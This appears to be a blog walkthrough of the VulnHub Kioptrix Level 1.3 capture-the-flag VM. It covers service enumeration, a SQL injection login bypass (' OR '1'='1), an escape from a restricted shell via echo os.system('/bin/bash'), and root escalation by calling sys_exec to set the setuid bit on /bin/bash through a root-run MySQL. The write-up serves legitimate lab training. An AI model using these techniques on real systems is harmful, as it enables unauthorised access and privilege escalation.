---
layout: post
title: Kioptrix Level 1.3 (#4) Writeup
excerpt: Kioptrix Level 1.3 is the fourth iteration of the Kioptrix VulnHub challenges. It involves taking advantage of a SQL injection vulnerablility to login to a simple web application that leaks user credentials. Using these credentials we can connect to the box via SSH. Unfortunately, our SSH sessions spawn a restricted shell with very limited command availability. We use `echo` to spawn a full bash shell and escape these confines, from which we enumerate the box and find MySQL credentials. MySQL is running as root and we are able to use `sys_exec` to set the setuid bit on `/bin/bash`. From here we can simply execute the binary and receieve a root shell.
tags: VulnHub
comments: true
social-share: false
thumbnail-img: /assets/img/VulnHub/kioptrix1.3_logo.png
---

Kioptrix Level 1.3 is the fourth iteration of the Kioptrix VulnHub challenges. It involves taking advantage of a SQL injection vulnerablility to login to a simple web application that leaks user credentials. 

Using these credentials we can connect to the box via SSH. Unfortunately, our SSH sessions spawn a restricted shell with very limited command availability. 

We use `echo` to spawn a full bash shell and escape these confines, from which we enumerate the box and find MySQL credentials.

MySQL is running as root and we are able to use `sys_exec` to set the setuid bit on `/bin/bash`. From here we can simply execute the binary and receieve a root shell.

# Enumeration

As always, we'll start with NMAP scans:

```bash
ein@~/VulnHub/Kioptrix1.3:$ sudo nmap -p- -Pn -sSV -oN kioptrix1.3 10.0.0.151
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-29 19:49 EDT
Nmap scan report for 10.0.0.151
Host is up (0.000057s latency).
Not shown: 39528 closed ports, 26003 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:D6:E7:AD (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumerating SMB

Let's go in reverse order here by hitting ports high-to-low. We'll start with SMB using `enum4linux` (I've redacted useless output):

```bash
ein@~:$ enum4linux 10.0.0.151
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul 29 23:14:43 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.0.0.151
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================== 
|    Enumerating Workgroup/Domain on 10.0.0.151    |
 ================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ========================================== 
|    Nbtstat Information for 10.0.0.151    |
 ========================================== 
Looking up status of 10.0.0.151
        KIOPTRIX4       <00> -         B <ACTIVE>  Workstation Service
        KIOPTRIX4       <03> -         B <ACTIVE>  Messenger Service
        KIOPTRIX4       <20> -         B <ACTIVE>  File Server Service
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name

        MAC Address = 00-00-00-00-00-00

 =================================== 
|    Session Check on 10.0.0.151    |
 =================================== 
[+] Server 10.0.0.151 allows sessions using username '', password ''

 ==================================== 
|    OS information on 10.0.0.151    |
 ==================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.0.0.151 from smbclient: 
[+] Got OS info for 10.0.0.151 from srvinfo:
        KIOPTRIX4      Wk Sv PrQ Unx NT SNT Kioptrix4 server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       4.9
        server type     :       0x809a03

 =========================== 
|    Users on 10.0.0.151    |
 =========================== 
index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody   Name: nobody    Desc: (null)
index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert   Name: ,,,       Desc: (null)
index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root     Name: root      Desc: (null)
index: 0x4 RID: 0xbba acb: 0x00000010 Account: john     Name: ,,,       Desc: (null)
index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret       Name: loneferret,,,     Desc: (null)

user:[nobody] rid:[0x1f5]
user:[robert] rid:[0xbbc]
user:[root] rid:[0x3e8]
user:[john] rid:[0xbba]
user:[loneferret] rid:[0xbb8]

 ======================================= 
|    Share Enumeration on 10.0.0.151    |
 ======================================= 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Kioptrix4 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            DESKTOP-PI36PQ0

[+] Attempting to map shares on 10.0.0.151
//10.0.0.151/print$     Mapping: DENIED, Listing: N/A
//10.0.0.151/IPC$       [E] Can't understand response:
NT_STATUS_NETWORK_ACCESS_DENIED listing \*

 ================================================== 
|    Password Policy Information for 10.0.0.151    |
 ================================================== 


[+] Attaching to 10.0.0.151 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] KIOPTRIX4
        [+] Builtin

 ===================================================================== 
|    Users on 10.0.0.151 via RID cycling (RIDS: 500-550,1000-1050)    |
 ===================================================================== 
...
...
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\loneferret (Local User)
S-1-22-1-1001 Unix User\john (Local User)
S-1-22-1-1002 Unix User\robert (Local User)

enum4linux complete on Wed Jul 29 23:14:53 2020

ein@~:$ 
```

There's lots to unpack here, but mainly let's note that there are some usernames we detected on the box:

```bash
S-1-22-1-1000 Unix User\loneferret (Local User)
S-1-22-1-1001 Unix User\john (Local User)
S-1-22-1-1002 Unix User\robert (Local User)
```

And some shares which we don't have access to:

```bash
 ======================================= 
|    Share Enumeration on 10.0.0.151    |
 ======================================= 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Kioptrix4 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            DESKTOP-PI36PQ0

[+] Attempting to map shares on 10.0.0.151
//10.0.0.151/print$     Mapping: DENIED, Listing: N/A
//10.0.0.151/IPC$       [E] Can't understand response:
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
```

Cool, that should cover SMB. Moving on to HTTP.

### Enumerating HTTP

Per usual we'll start by vising the website.

![Website homepage](/assets/img/VulnHub/Kioptrix1.3_1.PNG)

And we've got a login form. Let's get `ffuf` running in the background while we keep looking:

```bash
ein@~:$ ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.0.0.151/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git                                                                                                                                                                                                                          
________________________________________________                                                                                                                                                                                           
                                                                                                                                                                                                                                           
 :: Method           : GET                                                                                                                                                                                                                 
 :: URL              : http://10.0.0.151/FUZZ                                                                                                                                                                                              
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt                                                                                                                                                  
 :: Follow redirects : false                                                                                                                                                                                                               
 :: Calibration      : false                                                                                                                                                                                                               
 :: Timeout          : 10                                                                                                                                                                                                                  
 :: Threads          : 40                                                                                                                                                                                                                  
 :: Matcher          : Response status: 200,204,301,302,307,401,403                                                                                                                                                                        
________________________________________________                                                                                                                                                                                           
                                                                                                                                                                                                                                           
member                  [Status: 302, Size: 220, Words: 22, Lines: 2]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
images                  [Status: 301, Size: 348, Words: 23, Lines: 10]
index                   [Status: 200, Size: 1255, Words: 50, Lines: 46]
                        [Status: 200, Size: 1255, Words: 50, Lines: 46]
#                       [Status: 200, Size: 1255, Words: 50, Lines: 46]
# on atleast 2 different hosts [Status: 200, Size: 1255, Words: 50, Lines: 46]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 1255, Words: 50, Lines: 46]
#                       [Status: 200, Size: 1255, Words: 50, Lines: 46]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 1255, Words: 50, Lines: 46]
john                    [Status: 301, Size: 346, Words: 23, Lines: 10]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 1255, Words: 50, Lines: 46]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 1255, Words: 50, Lines: 46]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 1255, Words: 50, Lines: 46]
# This work is licensed under the Creative Commons  [Status: 200, Size: 1255, Words: 50, Lines: 46]
#                       [Status: 200, Size: 1255, Words: 50, Lines: 46]
# Copyright 2007 James Fisher [Status: 200, Size: 1255, Words: 50, Lines: 46]
#                       [Status: 200, Size: 1255, Words: 50, Lines: 46]
# directory-list-2.3-medium.txt [Status: 200, Size: 1255, Words: 50, Lines: 46]
robert                  [Status: 301, Size: 348, Words: 23, Lines: 10]
                        [Status: 200, Size: 1255, Words: 50, Lines: 46]
server-status           [Status: 403, Size: 330, Words: 24, Lines: 11]
:: Progress: [220560/220560] :: Job [1/1] :: 10502 req/sec :: Duration: [0:00:21] :: Errors: 0 ::
```

Hmm..`john` and `robert` stick out, let's take a look:

![Looking at the interesting sub-directories](/assets/img/VulnHub/Kioptrix1.3_2.PNG)

# Exploitation

Just a directory listing, and it looks like clicking on either file just redirects us to the homepage:

![302 Redirections](/assets/img/VulnHub/Kioptrix1.3_3.PNG)

Weird, well lets account for any low hanging fruit, starting with some weak password/SQLi guessing. Remember at this point we have the following usernames to test with:
- `john`
- `robert`
- `loneferret`

I'll start with attempting to login as `john` with a password of `' OR '1'='1`:

![302 Redirections](/assets/img/VulnHub/Kioptrix1.3_4.PNG)

And sure enough that got us in. Let's take a look at what the internal webpage looks like now.

![Logged in page](/assets/img/VulnHub/Kioptrix1.3_5.PNG)

Pretty straightforward, let's try to use these creds to connect via SSH:

```bash
ein@~/VulnHub/Kioptrix1.3:$ ssh john@10.0.0.151
john@10.0.0.151's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$ help
cd  clear  echo  exit  help  ll  lpath  ls
john:~$ 
```

Interesting, we're dropped in but we're in a restricted shell.

Now that we have a working (but restricted) shell on the box, let's try to exploit the available commands to break out of our _protections_.

First thing I notice is `echo`, maybe we can use this to execute a python command through `os.system()`?

```bash
john:~$ echo os.system('/bin/bash')
bash-3.2$ id && echo $0
uid=1001(john) gid=1001(john) groups=1001(john)
/bin/bash
bash-3.2$ 
```

Boom. Escaped the confines and have a full Bash session, now for privesc to root.

# Privilege Escalation

I'll begin by taking a look at the running processes on the host:

```bash
bash-3.2$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   2844  1692 ?        Ss   19:48   0:00 /sbin/init
root         2  0.0  0.0      0     0 ?        S<   19:48   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S<   19:48   0:00 [migration/0]
root         4  0.0  0.0      0     0 ?        S<   19:48   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   19:48   0:00 [watchdog/0]
root         6  0.0  0.0      0     0 ?        S<   19:48   0:00 [events/0]
root         7  0.0  0.0      0     0 ?        S<   19:48   0:00 [khelper]
root        41  0.0  0.0      0     0 ?        S<   19:48   0:00 [kblockd/0]
root        44  0.0  0.0      0     0 ?        S<   19:48   0:00 [kacpid]
root        45  0.0  0.0      0     0 ?        S<   19:48   0:00 [kacpi_notify]
root        88  0.0  0.0      0     0 ?        S<   19:48   0:00 [kseriod]
root       127  0.0  0.0      0     0 ?        S    19:48   0:00 [pdflush]
root       128  0.0  0.0      0     0 ?        S    19:48   0:00 [pdflush]                                                                                                                                                                 
root       129  0.0  0.0      0     0 ?        S<   19:48   0:00 [kswapd0]                                                                                                                                                                 
root       171  0.0  0.0      0     0 ?        S<   19:48   0:00 [aio/0]                                                                                                                                                                   
root      1277  0.0  0.0      0     0 ?        S<   19:48   0:00 [ata/0]                                                                                                                                                                   
root      1284  0.0  0.0      0     0 ?        S<   19:48   0:00 [ata_aux]                                                                                                                                                                 
root      1294  0.0  0.0      0     0 ?        S<   19:48   0:00 [ksuspend_usbd]                                                                                                                                                           
root      1299  0.0  0.0      0     0 ?        S<   19:48   0:00 [khubd]                                                                                                                                                                   
root      1968  0.0  0.0      0     0 ?        S<   19:48   0:00 [scsi_eh_0]                                                                                                                                                               
root      1970  0.0  0.0      0     0 ?        S<   19:48   0:00 [scsi_eh_1]                                                                                                                                                               
root      2186  0.0  0.0      0     0 ?        S<   19:48   0:00 [kjournald]                                                                                                                                                               
root      2353  0.0  0.0   2224   632 ?        S<s  19:48   0:00 /sbin/udevd --daemon                                                                                                                                                      
root      2573  0.0  0.0      0     0 ?        S<   19:48   0:00 [kpsmoused]                                                                                                                                                               
root      3864  0.0  0.0   1716   484 tty4     Ss+  19:48   0:00 /sbin/getty 38400 tty4                                                                                                                                                    
root      3867  0.0  0.0   1716   492 tty5     Ss+  19:48   0:00 /sbin/getty 38400 tty5                                                                                                                                                    
root      3873  0.0  0.0   1716   488 tty2     Ss+  19:48   0:00 /sbin/getty 38400 tty2                                                                                                                                                    
root      3876  0.0  0.0   1716   484 tty3     Ss+  19:48   0:00 /sbin/getty 38400 tty3                                                                                                                                                    
root      3881  0.0  0.0   1716   488 tty6     Ss+  19:48   0:00 /sbin/getty 38400 tty6                                                                                                                                                    
syslog    3913  0.0  0.0   1936   648 ?        Ss   19:48   0:00 /sbin/syslogd -u syslog                                                                                                                                                   
root      3932  0.0  0.0   1872   544 ?        S    19:48   0:00 /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/kmsg                                                                                                                         
klog      3934  0.0  0.0   3160  1968 ?        Ss   19:48   0:00 /sbin/klogd -P /var/run/klogd/kmsg
root      3953  0.0  0.0   5316   988 ?        Ss   19:48   0:00 /usr/sbin/sshd
root      4009  0.0  0.0   1772   528 ?        S    19:48   0:00 /bin/sh /usr/bin/mysqld_safe
root      4051  0.0  0.7 126988 16360 ?        Sl   19:48   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=3306 --socket=/var/run/mysqld/my
root      4053  0.0  0.0   1700   556 ?        S    19:48   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
root      4126  0.0  0.0   6532  1356 ?        Ss   19:48   0:00 /usr/sbin/nmbd -D
root      4128  0.0  0.1  10108  2540 ?        Ss   19:48   0:00 /usr/sbin/smbd -D
root      4142  0.0  0.0  10108  1028 ?        S    19:48   0:00 /usr/sbin/smbd -D
root      4143  0.0  0.0   8084  1344 ?        Ss   19:48   0:00 /usr/sbin/winbindd
root      4148  0.0  0.0   8208  1704 ?        S    19:48   0:00 /usr/sbin/winbindd
daemon    4164  0.0  0.0   1984   424 ?        Ss   19:48   0:00 /usr/sbin/atd
root      4175  0.0  0.0   2104   888 ?        Ss   19:48   0:00 /usr/sbin/cron
root      4197  0.0  0.2  20464  6200 ?        Ss   19:48   0:00 /usr/sbin/apache2 -k start
dhcp      4247  0.0  0.0   2440   624 ?        Ss   19:48   0:00 dhclient eth2
root      4254  0.0  0.0   1716   488 tty1     Ss+  19:48   0:00 /sbin/getty 38400 tty1
root      4273  0.0  0.0   8084   868 ?        S    19:56   0:00 /usr/sbin/winbindd
root      4274  0.0  0.0   8092  1280 ?        S    19:56   0:00 /usr/sbin/winbindd
www-data  4615  0.0  0.2  20620  5936 ?        S    20:03   0:01 /usr/sbin/apache2 -k start
www-data  4617  0.0  0.2  20596  5732 ?        S    20:03   0:01 /usr/sbin/apache2 -k start
www-data  4620  0.0  0.2  20620  5944 ?        S    20:03   0:01 /usr/sbin/apache2 -k start
www-data  4660  0.0  0.2  20596  5664 ?        S    20:03   0:01 /usr/sbin/apache2 -k start
www-data  4676  0.0  0.2  20596  5688 ?        S    20:03   0:01 /usr/sbin/apache2 -k start
www-data  4679  0.0  0.2  20604  5672 ?        S    20:06   0:01 /usr/sbin/apache2 -k start
root      4886  0.0  0.1  11360  3732 ?        Ss   21:23   0:00 sshd: john [priv]
john      4888  0.0  0.0  11516  1868 ?        S    21:23   0:00 sshd: john@pts/0 
john      4889  0.0  0.1   5892  3820 pts/0    Ss   21:23   0:00 python /bin/kshell
john      4894  0.0  0.0   1772   484 pts/0    S    21:26   0:00 sh -c /bin/bash
john      4895  0.0  0.1   5444  2872 pts/0    S    21:26   0:00 /bin/bash
root      4969  0.0  0.0   4072  1588 pts/0    S+   21:49   0:00 bash -p
www-data  5330  0.0  0.2  20464  4396 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5331  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5332  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5334  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5335  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5336  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5338  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5339  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5340  0.0  0.2  20488  4248 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5343  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5345  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5346  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5347  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5348  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5349  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5350  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5351  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5352  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5353  0.0  0.1  20464  3764 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5354  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5355  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5356  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5359  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5360  0.0  0.1  20464  3760 ?        S    23:19   0:00 /usr/sbin/apache2 -k start
www-data  5362  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5363  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5364  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5365  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5366  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5368  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5369  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5370  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5372  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5374  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5376  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5377  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5378  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5379  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5380  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5381  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5382  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5383  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5384  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5386  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5387  0.0  0.1  20464  3764 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5388  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5389  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
www-data  5390  0.0  0.1  20464  3760 ?        S    23:20   0:00 /usr/sbin/apache2 -k start
root      5393  0.0  0.1  11360  3720 ?        Ss   23:28   0:00 sshd: john [priv]
john      5395  0.0  0.0  11516  1856 ?        R    23:29   0:00 sshd: john@pts/1 
john      5396  0.0  0.1   6000  3824 pts/1    Ss   23:29   0:00 python /bin/kshell
john      5403  0.0  0.0   1772   488 pts/1    S    23:32   0:00 sh -c /bin/bash
john      5404  0.0  0.0   4580  1856 pts/1    R    23:32   0:00 /bin/bash
john      5406  0.0  0.0   2644  1012 pts/1    R+   23:33   0:00 ps aux
bash-3.2$ 
```

Pretty quiet, one thing that is to note is that `mysqld` is running as root. Let's see if there are any MySQL creds laying around we can take advantage of. We can start by looking around the default `/var/www` web directory.

```bash
bash-3.2$ pwd
/var/www
bash-3.2$ ls -la
total 44
drwxr-xr-x  5 root root 4096 2012-02-06 11:44 .
drwxr-xr-x 14 root root 4096 2012-02-04 09:57 ..
-rw-r--r--  1 root root 1477 2012-02-06 11:31 checklogin.php
-rw-r--r--  1 root root  298 2012-02-04 11:11 database.sql
drwxr-xr-x  2 root root 4096 2012-02-06 11:44 images
-rw-r--r--  1 root root 1255 2012-02-06 12:07 index.php
drwxr-xr-x  2 root root 4096 2012-02-04 18:33 john
-rw-r--r--  1 root root  176 2012-02-04 12:39 login_success.php
-rw-r--r--  1 root root   78 2012-02-04 11:33 logout.php
-rw-r--r--  1 root root  606 2012-02-06 15:42 member.php
drwxr-xr-x  2 root root 4096 2012-02-04 18:30 robert
bash-3.2$ 
```

I won't make you look in every file with me, eventually within `checklogin.php` we find the following:

```php
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
$db_name="members"; // Database name
$tbl_name="members"; // Table name
```

Nice, a root login with a blank password. Now let's try to use these creds:

```bash
bash-3.2$ mysql -u 'root' -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 41
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> 
```

And we have a working MySQL session, note that within the `enter password:` line, I simply entered a blank password.

Cool, so normally at this point you might want to look around the tables within the various databases, but since we know MySQL is running as root, there's some fun exploitation we can do.

There's a great and quick [blog post](https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/) that walks through this exploitation. 

So, now knowing this (assuming you read the link), we can simply utilize `sys_exec` to do some fun stuff:

```sql
mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> mysql> select sys_exec('chmod u+s /bin/bash');
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'mysql> select sys_exec('chmod u+s /bin/bash')' at line 1
mysql> use mysql;
Database changed
mysql> select sys_exec('chmod u+s /bin/bash');
+---------------------------------+
| sys_exec('chmod u+s /bin/bash') |
+---------------------------------+
| NULL                            | 
+---------------------------------+
1 row in set (0.01 sec)

mysql> exit
Bye
bash-3.2$ bash -p
bash-3.2# id
uid=1001(john) gid=1001(john) euid=0(root) groups=1001(john)
bash-3.2# cat /root/congrats.txt
Congratulations!
You've got root.

There is more then one way to get root on this system. Try and find them.
I've only tested two (2) methods, but it doesn't mean there aren't more.
As always there's an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it's not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.

If you haven't already, check out the other VMs available on:
www.kioptrix.com

Thanks for playing,
loneferret

bash-3.2# 
```

And that's root! If you're confused what we just did, first consider this for chmod:

_"The operator + causes the selected file mode bits to be added to the existing file mode bits of each file"_

So when we invoke `chmod u+s /bin/bash` We're setting the user bit of us (root) to /bin/bash on execution.

Next, we simply execute `/bin/bash -p` and get an _effective user ID_ of 0 (root). Note that this works because of the `-p` flag.. I skimmed through some documentation and this explanation of why this is neccessary is the best I could find:

{: .box-note}
If the shell is started with the effective user (group) id not equal to the real user (group) id, 
and the -p option is not supplied, no startup files are read, shell functions are not inherited from the environment, 
the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, 
are ignored, and the effective user id is set to the real user id. If the -p option is supplied at invocation, 
the startup behavior is the same, but the effective user id is not reset. 


So yeah, basically if you don't supply `-p` the effective user ID portion won't work. 



And that's it! Rooted.
